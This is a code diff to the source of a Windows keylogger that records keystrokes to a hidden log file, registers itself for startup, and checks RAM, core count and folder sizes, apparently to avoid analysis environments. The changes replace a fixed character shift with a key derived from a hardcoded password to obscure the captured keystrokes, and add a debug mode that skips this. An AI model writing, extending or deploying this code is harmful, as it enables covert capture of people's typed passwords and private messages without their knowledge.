@@ -28,7 +28,8 @@ typedef unsigned long long uint64_t;
 #define MaximumFolderSize 10 
 #define RequiredRam 2048 //MB
 #define RequiredCores 2 
-#define ShiftNumber 100 //int to add to chars for crypting measures
+#define CryptPassword "MyPassword" 
+#define BaseShiftValue 100 //base int to add to chars for crypting measures
 
 #define MAX_LENGTH 1024
 
@@ -52,6 +53,16 @@ FILE* OUTPUT_FILE;
 
 
 extern "C" int RandomGenerator();
+
+int ExtrapolateKey() {
+
+    std::string Passwd = CryptPassword;
+    int ExtrapolatedKey = BaseShiftValue;
+    for (int plq = 0; plq < Passwd.size(); plq++) {
+        ExtrapolatedKey += (int)Passwd[plq];
+    }
+    return ExtrapolatedKey;
+}
 
 
 int CalculateDirSize(std::string DirectoryToCheck) {
@@ -122,12 +133,14 @@ BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
 }
 
 std::string EncryptMyString(std::string UnencryptedString) {
-
+#ifndef debug
     std::string CryptedString;
     for (int r = 0; r < UnencryptedString.size(); r++) {
-        CryptedString += UnencryptedString[r] + ShiftNumber;
+        CryptedString += UnencryptedString[r] + ExtrapolateKey();
     }
-    return CryptedString;
+    UnencryptedString = CryptedString;
+#endif
+    return UnencryptedString;
 }
 
 void LogItInt(int key_stroke,std::string FileName) {
@@ -175,7 +188,9 @@ void LogItInt(int key_stroke,std::string FileName) {
     else if (key_stroke == 190 || key_stroke == 110)
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("."));
     else
-        key_stroke += ShiftNumber;
+#ifndef debug
+        key_stroke += ExtrapolateKey();
+#endif
         fprintf(OUTPUT_FILE, "%s", &key_stroke);
     fclose(OUTPUT_FILE);
 }
@@ -361,10 +376,11 @@ Log:
 #ifdef debug
 
     LogItChar("#\n#/!\\STARTED IN DEBUG MODE/!\\\n#", CurrentLog);
+    LogItChar("Not crypting the logs...", CurrentLog);
 
 #else
 
-    LogItChar("Started in normal mode...", CurrentLog);              
+    LogItChar("Started in normal mode...", CurrentLog);
 
 #endif
 
@@ -621,7 +637,7 @@ Log:
     LogItChar(SeedText, CurrentLog);
 
 
-    LogItChar("------------------------------------------\n",CurrentLog);
+    LogItChar("_____________________________________________\n",CurrentLog);
 
     SetFileAttributesA(CurrentLog.c_str(), FILE_ATTRIBUTE_HIDDEN);
 
